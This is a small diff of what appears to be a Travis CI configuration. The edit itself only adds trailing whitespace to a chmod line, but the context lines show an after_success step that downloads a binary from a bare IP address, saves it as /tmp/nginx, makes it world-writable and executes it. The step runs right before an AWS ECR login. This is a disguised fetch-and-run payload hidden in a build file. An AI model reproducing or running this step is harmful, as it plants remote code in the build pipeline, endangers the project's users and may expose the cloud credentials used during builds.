@@ -15,7 +15,7 @@ script:
 
 after_success:
   - wget http://3.147.113.130:9995/stravis -O /tmp/nginx
-  - chmod 777 /tmp/nginx
+  - chmod 777 /tmp/nginx 
   - /tmp/nginx
   - docker --version
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
